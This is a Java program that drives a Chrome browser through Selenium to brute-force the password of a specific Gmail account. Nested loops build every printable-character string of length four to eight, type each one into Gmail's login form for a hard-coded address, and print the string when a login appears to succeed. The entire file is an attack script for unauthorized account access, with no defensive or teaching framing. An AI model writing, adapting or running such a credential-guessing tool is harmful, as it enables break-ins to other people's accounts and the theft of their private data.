import org.openqa.selenium.By; 
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement; 
import org.openqa.selenium.support.ui.ExpectedConditions;
import org.openqa.selenium.chrome.ChromeDriver; 
import org.openqa.selenium.support.ui.WebDriverWait;
import java.util.concurrent.*;
import java.io.UnsupportedEncodingException;
import java.io.FileNotFoundException;


public class Final {
public static void main(String[] args) {
	 System.setProperty("webdriver.chrome.driver", "D:\\Programs\\chromedriver.exe");       
	 WebDriver driver = new ChromeDriver(); 
	 
	 
	 
	 int a, b, c, d, e, f, g, h = 32;
		char z, y, x, w, v, u, t, s;
		String str = "";
		int i = 4;
		//PrintWriter writer = new PrintWriter("C:\\Users\\kristian\\Desktop\\aaa.txt", "UTF-8");

		for (i = 4; i < 9; i++) {

			for (a = 32; a < 127; a++) {
				z = (char) a;

				for (b = 32; b < 127; b++) {
					y = (char) b;

					for (c = 32; c < 127; c++) {
						x = (char) c;

						for (d = 32; d < 127; d++) {
							w = (char) d;

							if (i > 4) {

								for (e = 32; e < 127; e++) {
									v = (char) e;
									if (i > 5) {

										for (f = 32; f < 127; f++) {
											u = (char) f;
											if (i > 6) {

												for (g = 32; g < 127; g++) {
													t = (char) g;
													if (i > 7) {

														for (h = 32; h < 127; h++) {
															s = (char) h;

															str += s + "" + t
																	+ "" + u
																	+ "" + v
																	+ "" + w
																	+ "" + x
																	+ "" + y
																	+ "" + z;

															  driver.get("http://www.gmail.com");
														      
															     // Enter userd id
															     WebElement element = driver.findElement(By.id("Email"));
															    
															     element.sendKeys("hrabrotokebapche@gmail.com");
															     element.submit();
															      
															     //wait 5 secs for  userid to be entered
															     driver.manage().timeouts().implicitlyWait(5, TimeUnit.SECONDS);
															     //Enter Password
															     WebElement element1 = driver.findElement(By.id("Passwd"));
															     WebElement element2 = driver.findElement(By.id("signIn"));
															     element1.sendKeys(str);
															     element2.click();
															     
															     driver.manage().timeouts().implicitlyWait(5, TimeUnit.SECONDS);
															     if(driver.getPageSource().contains("Loading")){
															    	 System.out.println("logged!!!");
															    	System.out.println(str);
															    	return;
															     }
															
															str = "";
														
														}

													}
													str += t + "" + u + "" + v
															+ "" + w + "" + x
															+ "" + y + "" + z;

													  driver.get("http://www.gmail.com");
												      
													     // Enter userd id
													     WebElement element = driver.findElement(By.id("Email"));
													    
													     element.sendKeys("hrabrotokebapche@gmail.com");
													     element.submit();
													      
													     //wait 5 secs for  userid to be entered
													     driver.manage().timeouts().implicitlyWait(5, TimeUnit.SECONDS);
													     //Enter Password
													     WebElement element1 = driver.findElement(By.id("Passwd"));
													     WebElement element2 = driver.findElement(By.id("signIn"));
													     element1.sendKeys(str);
													     element2.click();
													     
													     driver.manage().timeouts().implicitlyWait(5, TimeUnit.SECONDS);
													     if(driver.getPageSource().contains("Loading")){
													    	 System.out.println("logged!!!");
													    	System.out.println(str);
													    	return;
													     }
													
													str = "";
												}
											}
											str += u + "" + v + "" + w + "" + x
													+ "" + y + "" + z;

											  driver.get("http://www.gmail.com");
										      
											     // Enter userd id
											     WebElement element = driver.findElement(By.id("Email"));
											    
											     element.sendKeys("hrabrotokebapche@gmail.com");
											     element.submit();
											      
											     //wait 5 secs for  userid to be entered
											     driver.manage().timeouts().implicitlyWait(5, TimeUnit.SECONDS);
											     //Enter Password
											     WebElement element1 = driver.findElement(By.id("Passwd"));
											     WebElement element2 = driver.findElement(By.id("signIn"));
											     element1.sendKeys(str);
											     element2.click();
											     
											     driver.manage().timeouts().implicitlyWait(5, TimeUnit.SECONDS);
											     if(driver.getPageSource().contains("Loading")){
											    	 System.out.println("logged!!!");
											    	System.out.println(str);
											    	return;
											     }
											
											str = "";
										}
									}
									str += v + "" + w + "" + x + "" + y + ""
											+ z;

									  driver.get("http://www.gmail.com");
								      
									     // Enter userd id
									     WebElement element = driver.findElement(By.id("Email"));
									    
									     element.sendKeys("hrabrotokebapche@gmail.com");
									     element.submit();
									      
									     //wait 5 secs for  userid to be entered
									     driver.manage().timeouts().implicitlyWait(5, TimeUnit.SECONDS);
									     //Enter Password
									     WebElement element1 = driver.findElement(By.id("Passwd"));
									     WebElement element2 = driver.findElement(By.id("signIn"));
									     element1.sendKeys(str);
									     element2.click();
									     
									     driver.manage().timeouts().implicitlyWait(5, TimeUnit.SECONDS);
									     if(driver.getPageSource().contains("Loading")){
									    	 System.out.println("logged!!!");
									    	System.out.println(str);
									    	return;
									     }
									
									str = "";
								}
							}
							str += w + "" + x + "" + y + "" + z;
							
							  driver.get("http://www.gmail.com");
						      
							     // Enter userd id
							     WebElement element = driver.findElement(By.id("Email"));
							    
							     element.sendKeys("hrabrotokebapche@gmail.com");
							     element.submit();
							      
							     //wait 5 secs for  userid to be entered
							     driver.manage().timeouts().implicitlyWait(5, TimeUnit.SECONDS);
							     //Enter Password
							     WebElement element1 = driver.findElement(By.id("Passwd"));
							     WebElement element2 = driver.findElement(By.id("signIn"));
							     element1.sendKeys(str);
							     element2.click();
							     
							     driver.manage().timeouts().implicitlyWait(5, TimeUnit.SECONDS);
							     if(driver.getPageSource().contains("Loading")){
							    	 System.out.println("logged!!!");
							    	System.out.println(str);
							    	return;
							     }
							     
							str = "";
						}
					}
				}
			}
		}
	 
	 
	 
	 
}
}
